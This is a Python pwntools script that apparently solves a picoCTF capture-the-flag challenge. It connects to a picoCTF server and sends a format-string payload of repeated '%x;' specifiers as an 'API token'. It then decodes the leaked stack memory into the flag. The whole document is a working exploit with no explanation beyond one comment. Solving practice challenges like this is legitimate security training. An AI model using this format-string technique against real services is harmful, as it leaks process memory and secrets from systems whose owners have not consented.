import warnings

warnings.filterwarnings("ignore")

from pwn import *
from codecs import decode

p = remote("mercury.picoctf.net", 27912)
print(p.recvuntil("2) View my portfolio"))
p.sendline("1")
print(p.recvuntil("What is your API token?"))
p.sendline("%x;" * 500)
print(p.recvuntil("Buying stonks with token:\n"))
memLeaks = p.recvline()
p.recvall()

print("-" * 100)

tokens = memLeaks.decode("utf-8").split(";")
flag = ""

for token in tokens:
  try:
    token = bytearray.fromhex(token).decode("utf-8")[::-1] #Bytes of string needs to be reserved to accomodate for little and big endian difference
    flag += token
  except:
    continue

print(flag)